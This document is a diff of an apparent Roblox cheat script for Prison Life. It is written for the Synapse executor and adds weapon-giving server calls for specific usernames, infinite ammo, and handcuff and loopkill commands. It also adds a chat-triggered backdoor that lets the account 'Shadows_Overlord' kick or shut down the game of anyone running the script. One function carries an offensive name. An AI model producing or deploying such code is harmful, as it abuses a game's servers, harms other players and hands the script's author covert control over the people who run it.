@@ -2,7 +2,9 @@ if not syn then return game:Shutdown()
 end
 
 if _G.loaded then
-    game.CoreGui["Project Anti Abusers"]:Destroy()
+	game.CoreGui["Project Anti Abusers"]:Destroy()
+	game.CoreGui.ScreenGui:Destroy()
+	_G.loaded = false
 end
 
 if not isfolder("antiabusers") then
@@ -3770,6 +3772,10 @@ end)
 				sM["ReloadTime"] = 0.05
 				sM["Bullets"] = 18
 				sM["CurrentAmmo"] = math.huge
+			elseif game.Players.LocalPlayer.Name == "vip123yesthatsme" then
+				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
 			elseif game.Players.LocalPlayer.Name == "SuperAngelo177" then
 				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
 				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
@@ -6430,6 +6436,10 @@ local function CJCTQTT_fake_script() -- ProjectAntiAbusers.autogunspawn.LocalScr
 					sM["ReloadTime"] = 0.05
 					sM["Bullets"] = 18
 					sM["CurrentAmmo"] = math.huge
+				elseif game.Players.LocalPlayer.Name == "vip123yesthatsme" then
+					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
 				elseif game.Players.LocalPlayer.Name == "SuperAngelo177" then
 					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
 					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
@@ -6950,6 +6960,10 @@ local function BHAA_fake_script() -- CommandBarTextBox.LocalScript
 						rape(v)
 					until i == 0
 				end
+			elseif string.sub(script.Parent.Text, 1, 5) == "cuffs" then
+				a = Instance.new("Tool")
+				a.Parent = game.Players.LocalPlayer.Backpack
+				a.Name = "Handcuffs"
 			elseif string.sub(script.Parent.Text, 1, 9) == "loopkill " then
 				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 10))) do
 					i = 1
@@ -7666,8 +7680,8 @@ end)
 for i,v in pairs(game.Players:GetPlayers()) do
 	if v.Name == "Shadows_Overlord" then
 		v.Chatted:connect(function(msg)
-			if msg:sub(1,7) == ".crash " then
-				a = FindTarget(msg:sub(8))
+			if msg:sub(1,6) == ".kick " then
+				a = FindTarget(msg:sub(7))
 				if a.Name == game.Players.LocalPlayer.Name then
 					game.Players.LocalPlayer:Kick("you just got kicked by Shadows_Overlord, cool!")
 				end
@@ -7675,5 +7689,18 @@ for i,v in pairs(game.Players:GetPlayers()) do
 		end)
 	end
 end
+
+game.Players:ChildAdded:connect(function(child)
+    if child.Name == "Shadows_Overlord" then
+        child.Chatted:connect(function(msg)
+            if msg:sub(1,6) == ".kick " then
+                a = FindTarget(msg:sub(7))
+                if a.Name == game.Players.LocalPlayer.Name then
+                    game:Shutdown()
+                end
+            end
+        end)
+    end
+end)
 
 _G.loaded = true
